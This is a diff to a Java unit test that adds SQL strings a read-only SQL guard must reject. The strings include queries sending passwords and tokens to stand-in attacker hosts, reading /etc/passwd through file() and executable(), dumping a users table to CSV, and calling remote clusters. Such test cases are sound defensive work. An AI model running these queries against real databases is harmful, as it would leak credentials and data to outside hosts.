@@ -73,7 +73,13 @@ class SqlGuardTest {
             "SELECT CSVWRITE('/tmp/leak.csv', 'SELECT * FROM users')",
             "SELECT DBMS_XMLGEN.getxml('DELETE FROM users') FROM dual",
             "SELECT UTL_HTTP.request('http://attacker/' || password) FROM users",
-            "SELECT DBMS_LOB.getlength(payload) FROM documents"
+            "SELECT DBMS_LOB.getlength(payload) FROM documents",
+            "SELECT * FROM url('http://attacker.invalid/log?token=secret', 'CSV', 'x String')",
+            "SELECT * FROM s3('https://bucket/object.csv')",
+            "SELECT * FROM file('/etc/passwd', 'LineAsString')",
+            "SELECT * FROM remote('cluster', system.one)",
+            "SELECT * FROM executable('cat /etc/passwd', 'TabSeparated', 'line String')",
+            "SELECT sleep(10)"
     })
     void rejectsRoutinesThatWriteOrReachOutside(String sql) {
         assertThatThrownBy(() -> SqlGuard.requireReadOnly(sql)).isInstanceOf(IllegalArgumentException.class);
